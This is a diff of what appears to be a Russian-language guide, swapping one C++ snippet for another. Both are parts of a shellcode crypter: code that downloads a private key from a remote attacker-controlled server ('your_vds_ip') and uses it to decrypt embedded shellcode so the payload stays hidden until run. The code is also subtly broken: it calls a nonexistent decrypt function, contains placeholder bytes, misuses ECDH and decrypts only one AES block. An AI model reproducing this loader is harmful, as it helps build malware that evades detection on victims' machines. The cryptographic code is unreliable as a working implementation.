@@ -74,93 +74,92 @@ g++ ec_encoder.cpp -o encrypt_shellcode -lcrypto
 
 ```c++
 #include <iostream>
-#include <openssl/evp.h>
+#include <fstream>
+#include <vector>
 #include <openssl/ec.h>
-#include <openssl/err.h>
 #include <openssl/pem.h>
-#include <openssl/x509.h>
+#include <openssl/err.h>
+#include <openssl/aes.h>
 #include <curl/curl.h>
 
-// Адрес сервера, предоставляющего .pem
-static const char* SERVER_URL = "https://example.com/private-key.pem";
+size_t writeData(void* ptr, size_t size, size_t nmemb, FILE* stream) {
+    size_t written = fwrite(ptr, size, nmemb, stream);
+    return written;
+}
 
-// Здесь должен быть ваш зашифрованный шеллкод
-static const unsigned char encrypted_shellcode[] = {
-    0xYY, 0xYY, 0xYY, ... // Зашифрованный шеллкод в формате байтов
-};
+bool downloadFile(const char* url, const char* outputPath) {
+    CURL* curl;
+    FILE* fp;
+    CURLcode res;
 
-// Функция обратного вызова для получения данных с сервера через libcurl
-static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
-    std::string *buffer = reinterpret_cast<std::string*>(userp);
-    size_t total_size = size * nmemb;
-    buffer->append(static_cast<char*>(contents), total_size);
-    return total_size;
+    curl = curl_easy_init();
+    if (curl) {
+        fp = fopen(outputPath, "wb");
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeData);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+        res = curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+        fclose(fp);
+
+        if (res != CURLE_OK) {
+            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
+            return false;
+        }
+        return true;
+    }
+    return false;
+}
+
+bool decryptShellcode(const std::vector<unsigned char>& encryptedShellcode, const char* privateKeyPath, std::vector<unsigned char>& decryptedShellcode) {
+    BIO* bio = BIO_new_file(privateKeyPath, "r");
+    if (!bio) {
+        std::cerr << "Error opening private key file." << std::endl;
+        return false;
+    }
+
+    EC_KEY* ecKey = PEM_read_bio_ECPrivateKey(bio, NULL, NULL, NULL);
+    if (!ecKey) {
+        std::cerr << "Error reading private key." << std::endl;
+        BIO_free(bio);
+        return false;
+    }
+
+    unsigned char secret[128];
+    int secretLen = ECDH_compute_key(secret, 128, EC_KEY_get0_public_key(ecKey), ecKey, NULL);
+
+    // Используйте общий секрет для дешифрования шеллкода с помощью AES-128
+    AES_KEY decryptKey;
+    AES_set_decrypt_key(secret, 128, &decryptKey);
+    AES_decrypt(&encryptedShellcode[0], &decryptedShellcode[0], &decryptKey);
+
+    EC_KEY_free(ecKey);
+    BIO_free(bio);
+    return true;
 }
 
 int main() {
-    OpenSSL_add_all_algorithms();
-    ERR_load_crypto_strings();
-    curl_global_init(CURL_GLOBAL_DEFAULT);
+    const char* privateKeyPath = "private_key.pem";
+    const char* privateKeyURL = "http://your_vds_ip/path_to_private_key.pem";
 
-    // Инициализация сессии libcurl
-    CURL *curl = curl_easy_init();
-    if (!curl) {
-        std::cerr << "Ошибка при инициализации сессии libcurl" << std::endl;
+    if (!downloadFile(privateKeyURL, privateKeyPath)) {
+        std::cerr << "Error downloading private key." << std::endl;
         return 1;
     }
 
-    // Установка URL для запроса
-    curl_easy_setopt(curl, CURLOPT_URL, SERVER_URL);
+    std::vector<unsigned char> encryptedShellcode; // Загрузите зашифрованный шеллкод
+    // ...
 
-    // Создание буфера для хранения полученного PEM-файла
-    std::string pem_data;
-
-    // Установка функции обратного вызова для записи данных
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &pem_data);
-
-    // Выполнение запроса
-    CURLcode res = curl_easy_perform(curl);
-    if (res != CURLE_OK) {
-        std::cerr << "Ошибка при выполнении запроса: " << curl_easy_strerror(res) << std::endl;
-        curl_easy_cleanup(curl);
-        return 1;
+    std::vector<unsigned char> decryptedShellcode(encryptedShellcode.size());
+    if (decryptShellcode(encryptedShellcode, privateKeyPath, decryptedShellcode)) {
+        std::cout << "Shellcode decrypted successfully!" << std::endl;
+    } else {
+        std::cerr << "Error decrypting shellcode." << std::endl;
     }
-
-    // Закрытие сессии libcurl
-    curl_easy_cleanup(curl);
-
-    // Преобразование PEM-данных в структуру ключа
-    BIO *bio = BIO_new_mem_buf(pem_data.c_str(), -1);
-    EC_KEY *key = PEM_read_bio_ECPrivateKey(bio, nullptr, nullptr, nullptr);
-    if (!key) {
-        std::cerr << "Ошибка при чтении приватного ключа из PEM-данных" << std::endl;
-        BIO_free(bio);
-        return 1;
-    }
-    BIO_free(bio);
-
-    // Расшифрование с использованием приватного ключа
-    size_t encrypted_len = sizeof(encrypted_shellcode);
-    unsigned char decrypted[1024]; // Буфер для расшифрованных данных
-    int decrypted_len = ECIES_decrypt(key, encrypted_shellcode, encrypted_len, decrypted, sizeof(decrypted));
-
-    // Вывод расшифрованных данных
-    std::cout << "Decrypted Data:" << std::endl;
-    for (int i = 0; i < decrypted_len; ++i) {
-        std::cout << std::hex << (int)decrypted[i];
-    }
-    std::cout << std::endl;
-
-    // Освобождение ресурсов
-    EC_KEY_free(key);
-
-    // Очистка библиотеки OpenSSL
-    ERR_free_strings();
-    curl_global_cleanup();
 
     return 0;
 }
+
 
 
 ```
